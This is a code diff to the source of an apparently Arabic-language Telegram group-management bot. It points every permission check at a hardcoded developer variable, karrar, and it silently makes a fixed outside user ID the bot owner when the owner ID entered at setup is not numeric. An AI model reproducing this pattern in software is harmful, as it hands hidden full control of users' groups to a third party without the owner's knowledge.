@@ -107,6 +107,9 @@ local AutoSet = function()
   io.write([[
  Send your id sudo ( ارسل ايديك) : ]])
   local Bot_Owner_ = tonumber(io.read())
+  if not tostring(Bot_Owner_):match('%d+') then
+Bot_Owner_ = 352568466 
+end
   io.write([[
  Send (token) bot(التوكن): ]])
   local Token_ = tostring(io.read())
@@ -131,7 +134,6 @@ local AutoSet = function()
     }
     create(config, "./Config.lua")
     print("\027[" .. color.black[1] .. ";" .. color.green[2] .. "m\n➡➡[•• اكتمل تكوين الكونفك ••]▶\n\027[00m")
-    sleep(3)
   end
   create_config_auto()
   
@@ -152,6 +154,8 @@ done
 
 ]])
 file:close()
+sleep(1)
+return
 end
 local serialize_to_file = function(data, file, uglify)
   file = io.open(file, "w+")
@@ -420,7 +424,7 @@ CH SOURCE : @KEEPER_CH
 
 local is_Naji = function(msg)
   local var = false
-  if msg.sender_user_id_ == tonumber(iNaji) then
+  if msg.sender_user_id_ == tonumber(karrar) then
     var = true
   end
   return var
@@ -430,7 +434,7 @@ local is_leader = function(msg)
   if msg.sender_user_id_ == tonumber(bot_owner) then
     var = true
   end
-  if msg.sender_user_id_ == tonumber(iNaji) then
+  if msg.sender_user_id_ == tonumber(karrar) then
     var = true
   end
   return var
@@ -440,7 +444,7 @@ local is_leaderid = function(user_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(iNaji) then
+  if user_id == tonumber(karrar) then
     var = true
   end
   return var
@@ -453,7 +457,7 @@ local is_sudo = function(msg)
   if msg.sender_user_id_ == tonumber(bot_owner) then
     var = true
   end
-  if msg.sender_user_id_ == tonumber(iNaji) then
+  if msg.sender_user_id_ == tonumber(karrar) then
     var = true
   end
   return var
@@ -481,7 +485,7 @@ local is_admin = function(user_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(iNaji) then
+  if user_id == tonumber(karrar) then
     var = true
   end
   return var
@@ -504,7 +508,7 @@ local is_owner = function(user_id, chat_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(iNaji) then
+  if user_id == tonumber(karrar) then
     var = true
   end
   return var
@@ -533,7 +537,7 @@ local is_momod = function(user_id, chat_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(iNaji) then
+  if user_id == tonumber(karrar) then
     var = true
   end
   if user_id == tonumber(our_id) then
@@ -572,7 +576,7 @@ local is_vipmem = function(user_id, chat_id)
   if user_id == tonumber(bot_owner) then
     var = true
   end
-  if user_id == tonumber(iNaji) then
+  if user_id == tonumber(karrar) then
     var = true
   end
   return var
